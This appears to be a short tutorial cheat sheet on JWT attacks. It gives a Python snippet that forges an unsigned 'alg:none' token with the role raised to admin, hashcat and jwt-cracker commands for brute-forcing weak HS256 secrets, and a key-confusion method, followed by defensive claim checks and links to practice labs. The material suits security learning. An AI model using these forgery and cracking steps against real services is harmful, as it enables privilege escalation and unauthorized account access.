# JWT attacks — decode, tamper, crack

Three main attacks: algorithm confusion, weak secret, and key confusion.

## Decode a JWT manually

```bash
# A JWT has three base64url-encoded parts: header.payload.signature
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.sig"

# Decode header (part 1)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

# Decode payload (part 2)
echo "eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ" | base64 -d
# {"sub":"user123","role":"user"}

# Or use jwt.io in the browser — paste token, see decoded claims
```

## Attack 1 — Algorithm none

Change `"alg":"HS256"` to `"alg":"none"`, change `"role":"user"` to `"role":"admin"`, remove the signature (keep trailing dot).

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"user123","role":"admin"}).encode()).rstrip(b'=')
token = header.decode() + "." + payload.decode() + "."
print(token)
```

Send this token — if the server accepts it, `alg:none` attack works.

## Attack 2 — Crack weak HS256 secret

```bash
# Save token to file
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIn0.sig" > token.txt

# Crack with hashcat
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt

# Or with jwt-cracker
npm install -g jwt-cracker
jwt-cracker eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIn0.sig -w rockyou.txt
```

If cracked, resign your modified payload with the discovered secret.

## Attack 3 — RS256 to HS256 key confusion

When server uses RS256 (asymmetric), public key is often discoverable.
Switch algorithm to HS256 and sign with the public key — server may verify using the public key as HMAC secret.

Use Burp JWT Editor extension to automate this: install from BApp Store → JWT Editor → Key Confusion Attack.

## Claims to validate (defense)

```
exp  — expiry timestamp — must be in the future
iss  — issuer — must match expected value
aud  — audience — must match this service
nbf  — not before — token not valid before this time
```

## Practice

PortSwigger JWT labs (8 labs): https://portswigger.net/web-security/jwt
Install Burp JWT Editor extension: BApp Store → search "JWT Editor"
